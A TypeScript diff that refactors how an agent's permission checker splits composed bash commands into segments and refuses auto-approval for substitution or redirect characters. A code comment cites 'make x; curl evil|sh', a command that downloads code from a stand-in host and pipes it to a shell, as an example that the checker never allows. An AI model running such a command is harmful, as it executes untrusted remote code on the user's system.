@@ -177,13 +177,22 @@ const NEVER_COMPOSE = /[`<>]|\$\(/;
  * allow `echo a && sleep 1 && echo b`, while `"make *"` never allows
  * `make x; curl evil|sh` (the curl/sh segments match nothing). */
 export function composedAllows(patterns: string[] | undefined, command: string): boolean {
-  if (NEVER_COMPOSE.test(command)) return false;
-  if (!SEGMENT_SPLIT.test(command)) return true;
+  const segments = commandSegments(command);
+  if (segments === undefined) return false;
+  return segments.every((segment) => matches(patterns, segment));
+}
+
+/** The independently-gated segments of a composed bash command, or
+ * undefined when the command contains substitution/redirect characters
+ * that never compose (those always ask). Shared by permission allows and
+ * sandbox prefix grants — one splitter, one truth. */
+export function commandSegments(command: string): string[] | undefined {
+  if (NEVER_COMPOSE.test(command)) return undefined;
   const segments = command
     .split(SEGMENT_SPLIT)
     .map((segment) => segment.trim())
     .filter((segment) => segment.length > 0);
-  return segments.length > 0 && segments.every((segment) => matches(patterns, segment));
+  return segments.length > 0 ? segments : undefined;
 }
 
 /**
